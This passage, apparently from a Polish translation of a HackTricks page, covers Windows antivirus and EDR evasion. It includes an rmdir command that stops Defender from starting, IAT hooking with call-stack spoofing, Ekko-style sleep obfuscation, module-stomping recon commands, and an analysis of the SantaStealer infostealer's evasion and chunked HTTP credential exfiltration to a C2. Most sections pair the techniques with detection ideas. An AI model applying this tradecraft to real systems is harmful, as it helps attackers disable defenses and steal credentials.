Powinieneś obserwować nowy path procesu w `C:\TMP\AV\` oraz konfigurację usługi/registry odzwierciedlającą tę lokalizację.

Post-exploitation options
- DLL sideloading/code execution: Wdrożenie/zastąpienie DLL-ów, które Defender ładuje ze swojego application directory, aby wykonać code w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym starcie skonfigurowany path nie dał się rozwiązać i Defender nie mógł się uruchomić:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Zwróć uwagę, że ta technika sama w sobie nie zapewnia privilege escalation; wymaga uprawnień admina.

## API/IAT Hooking + Call-Stack Spoofing z PIC (styl Crystal Kit)

Red teams mogą przenieść runtime evasion z implantu C2 do samego modułu celu, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, position‑independent code (PIC). To uogólnia evasion poza małą powierzchnię API, którą ujawnia wiele kitów (np. CreateProcessA), i rozszerza te same zabezpieczenia na BOFs oraz post‑exploitation DLLs.

Podejście wysokiego poziomu
- Umieść blob PIC obok docelowego modułu, używając reflective loadera (jako prepended albo companion). PIC musi być self-contained i position-independent.
- Gdy host DLL się ładuje, przejdź przez jego IMAGE_IMPORT_DESCRIPTOR i załatkuj wpisy IAT dla docelowych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na cienkie wrappery PIC.
- Każdy wrapper PIC wykonuje evasion przed tail-calling właściwego adresu API. Typowe evasion obejmują:
- Maskowanie/odmaskowanie pamięci wokół wywołania (np. szyfrowanie regionów beacon, RWX→RX, zmiana nazw/uprawnień stron) i potem przywrócenie stanu po wywołaniu.
- Call-stack spoofing: zbuduj benign stack i przejdź do docelowego API, tak aby analiza call-stack rozwiązywała się do oczekiwanych ramek.
- Dla kompatybilności wyeksportuj interfejs, aby Aggressor script (lub odpowiednik) mógł rejestrować, które API hookować dla Beacon, BOFs i post-ex DLLs.

Dlaczego tutaj IAT hooking
- Działa dla dowolnego kodu, który używa hookowanego importu, bez modyfikowania kodu narzędzia ani polegania na Beacon do proxy konkretnych API.
- Obejmuje post-ex DLLs: hookowanie LoadLibrary* pozwala przechwytywać ładowanie modułów (np. System.Management.Automation.dll, clr.dll) i stosować to samo masking/stack evasion do ich wywołań API.
- Przywraca niezawodne użycie poleceń post-ex uruchamiających procesy przeciwko detekcjom opartym na call-stack, poprzez owinięcie CreateProcessA/W.

Minimalny szkic IAT hooka (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Uwagi
- Zastosuj patch po relocacjach/ASLR i przed pierwszym użyciem importu. Reflective loaders takie jak TitanLdr/AceLdr pokazują hooking podczas DllMain załadowanego modułu.
- Trzymaj wrappers małe i PIC-safe; rozwiąż prawdziwe API przez oryginalną wartość IAT, którą przechwyciłeś przed patchingiem, albo przez LdrGetProcedureAddress.
- Używaj przejść RW → RX dla PIC i unikaj pozostawiania stron writable+executable.

Stub do call-stack spoofing
- PIC stubs w stylu Draugr budują fałszywy łańcuch wywołań (return addresses do benign modules), a potem pivotują do real API.
- To omija detekcje, które oczekują kanonicznych stacków z Beacon/BOFs do wrażliwych API.
- Połącz to z technikami stack cutting/stack stitching, aby wylądować wewnątrz oczekiwanych ramek przed prologiem API.

Integracja operacyjna
- Dodaj reflective loader przed post-ex DLLs, aby PIC i hooki inicjalizowały się automatycznie po załadowaniu DLL.
- Użyj Aggressor script do rejestrowania docelowych API, aby Beacon i BOFs transparentnie korzystały z tego samego path evasion bez zmian w kodzie.

Uwagi dotyczące detekcji/DFIR
- Integralność IAT: wpisy, które rozwiązują się do adresów spoza obrazu (heap/anon); okresowa weryfikacja wskaźników importów.
- Anomalie stacka: return addresses nie należące do załadowanych obrazów; nagłe przejścia do nie-obrazu PIC; niespójny RtlUserThreadStart ancestry.
- Telemetria loadera: zapisy do IAT w procesie, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane regiony RX tworzone przy load.
- Image-load evasion: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania automation/clr assemblies skorelowane z eventami memory masking.

Powiązane building blocks i przykłady
- Reflective loaders wykonujące patching IAT podczas load (np. TitanLdr, AceLdr)
- Memory masking hooks (np. simplehook) i PIC stack-cutting (stackcutting)
- PIC call-stack spoofing stubs (np. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Jeśli kontrolujesz reflective loader, możesz hookować importy **podczas** `ProcessImports()` przez zastąpienie wskaźnika `GetProcAddress` loadera własnym resolverem, który najpierw sprawdza hooki:

- Zbuduj **resident PICO** (persistent PIC object), który przetrwa po tym, jak tymczasowy loader PIC sam się zwolni.
- Wyeksportuj funkcję `setup_hooks()`, która nadpisuje resolver importów loadera (np. `funcs.GetProcAddress = _GetProcAddress`).
- W `_GetProcAddress` pomijaj importy po ordinal i użyj lookup hooków opartych na hash, np. `__resolve_hook(ror13hash(name))`. Jeśli hook istnieje, zwróć go; w przeciwnym razie deleguj do prawdziwego `GetProcAddress`.
- Zarejestruj cele hooków w czasie linkowania za pomocą wpisów Crystal Palace `addhook "MODULE$Func" "hook"`. Hook pozostaje ważny, bo żyje wewnątrz resident PICO.

To daje **import-time IAT redirection** bez patchowania sekcji kodu załadowanego DLL po load.

### Wymuszanie hookowalnych importów, gdy target używa PEB-walking

Import-time hooki zadziałają tylko wtedy, gdy funkcja faktycznie znajduje się w IAT targetu. Jeśli moduł rozwiązuje API przez PEB-walk + hash (bez wpisu importu), wymuś prawdziwy import, aby ścieżka `ProcessImports()` loadera go zobaczyła:

- Zastąp hashed export resolution (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając intercept, gdy reflective loader rozwiązuje importy.

### Obfuscation snu/idle w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **rzeczywiste primitive wait/IPC**, których używa implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Dla długich waitów owiń wywołanie w chain obfuscation w stylu Ekko, który szyfruje obraz w pamięci podczas idle:

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z przygotowanymi frame `CONTEXT`.
- Typowy chain (x64): ustaw obraz na `PAGE_READWRITE` → RC4 encrypt przez `advapi32!SystemFunction032` na całym zmapowanym obrazie → wykonaj blokujący wait → RC4 decrypt → **przywróć uprawnienia per-section** przez przejście po sekcjach PE → zgłoś zakończenie.
- `RtlCaptureContext` daje szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy krok.

Szczegół operacyjny: zwracaj „success” dla długich waitów (np. `WAIT_OBJECT_0`), aby caller kontynuował, gdy obraz jest maskowany. Ten wzorzec ukrywa moduł przed scannerami podczas okien idle i unika klasycznego sygnatury „patched `Sleep()`”.

Pomysły na detekcję (oparte na telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- `advapi32!SystemFunction032` używane na dużych, ciągłych buforach o rozmiarze obrazu.
- `VirtualProtect` na dużym zakresie, po którym następuje własne przywracanie uprawnień per-section.


## Precision Module Stomping

Module stomping wykonuje payloads z **sekcji `.text` DLL już zmapowanej w procesie target** zamiast alokować oczywistą prywatną pamięć executable albo ładować świeżą, sacrificial DLL. Celem nadpisania powinna być **załadowana, wsparta plikiem image**, której przestrzeń kodu może przyjąć payload bez psucia ścieżek kodu, których proces nadal potrzebuje.

### Niezawodny wybór targetu

Naive stomping na popularnych modułach, takich jak `uxtheme.dll` lub `comctl32.dll`, jest kruche: DLL może nie być załadowany w zdalnym procesie, a zbyt mały region kodu spowoduje crash procesu. Bardziej niezawodny workflow to:

1. Wylistuj moduły target procesu i zachowaj **include list tylko z nazwami** DLL już załadowanych.
2. Zbuduj payload najpierw i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj kandydackie DLL na dysku i porównaj PE section **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. To ważniejsze niż rozmiar pliku, bo odzwierciedla rozmiar sekcji executable **po zmapowaniu do pamięci**.
4. Sparsuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako offset startowy stomping.
5. Oblicz **blast radius**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiednie eksporty ułożone za nią w pamięci.

Typowe helpers do recon/selection spotykane w praktyce:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Preferuj DLL-e **już załadowane** w zdalnym procesie, aby uniknąć telemetrii `LoadLibrary`/nieoczekiwanych image loads.
- Preferuj eksporty, które są rzadko wykonywane przez aplikację docelową, w przeciwnym razie normalne ścieżki kodu mogą trafić w stomped bytes przed lub po utworzeniu wątku.
- Duże implanty często wymagają zmiany osadzania shellcode z string literal na **byte-array/braced initializer**, aby pełny bufor był poprawnie reprezentowany w źródle injectora.

Detection ideas
- Zdalne zapisy do **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) zamiast bardziej typowych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie zgadzają się już z plikiem źródłowym na dysku.
- Zdalne wątki lub pivots kontekstu, które rozpoczynają wykonanie wewnątrz legalnego eksportu DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` przeciwko stronom `.text` DLL, po których następuje utworzenie wątku.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) pokazuje, jak nowoczesne info-stealers łączą AV bypass, anti-analysis i credential access w jednym workflow.

### Keyboard layout gating & sandbox delay

- Flaga konfiguracyjna (`anti_cis`) wylicza zainstalowane keyboard layouts za pomocą `GetKeyboardLayoutList`. Jeśli zostanie znaleziony Cyrillic layout, próbka tworzy pusty marker `CIS` i kończy działanie przed uruchomieniem stealers, zapewniając, że nigdy nie uruchomi się w wykluczonych lokalizacjach, a jednocześnie pozostawi artefakt do hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Warstwowa logika `check_antivm`

- Wariant A przechodzi przez listę procesów, hashuje każdą nazwę za pomocą niestandardowej rolling checksum i porównuje ją z osadzonymi blocklists dla debuggerów/sandboxów; powtarza checksum dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny uptime), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, oraz wykonuje timing checks wokół sleepów, żeby wykryć single-stepping. Każde trafienie przerywa działanie, zanim moduły zostaną uruchomione.

### Fileless helper + podwójne ChaCha20 reflective loading

- Główna DLL/EXE osadza Chromium credential helper, który jest albo zapisywany na dysk, albo ręcznie mapowany w pamięci; tryb fileless sam rozwiązuje importy/relokacje, więc żadne artefakty helpera nie są zapisywane.
- Ten helper przechowuje DLL drugiego etapu zaszyfrowaną dwa razy za pomocą ChaCha20 (dwa 32-bajtowe klucze + 12-bajtowe nonces). Po obu przebiegach reflective loads blob (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Rutyny ChromElevator używają direct-syscall reflective process hollowing do wstrzyknięcia do działającej przeglądarki Chromium, dziedziczą AppBound Encryption keys i odszyfrowują hasła/cookies/karty kredytowe bezpośrednio z baz SQLite mimo hardeningu ABE.


### Modularne zbieranie w pamięci & chunked HTTP exfil

- `create_memory_based_log` iteruje po globalnej tabeli wskaźników funkcji `memory_generators` i uruchamia jeden wątek na każdy włączony moduł (Telegram, Discord, Steam, screenshots, documents, browser extensions, itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i raportuje swoją liczbę plików po oknie dołączenia ~45s.
- Po zakończeniu wszystko jest zipowane za pomocą statycznie linkowanej biblioteki `miniz` jako `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` śpi 15s i streamuje archiwum w kawałkach po 10 MB przez HTTP POST do `http://<C2>:6767/upload`, podszywając się pod browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Każdy chunk dodaje `User-Agent: upload`, `auth: <build_id>`, opcjonalnie `w: <campaign_tag>`, a ostatni chunk dopisuje `complete: true`, aby C2 wiedziało, że reassembly jest zakończone.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
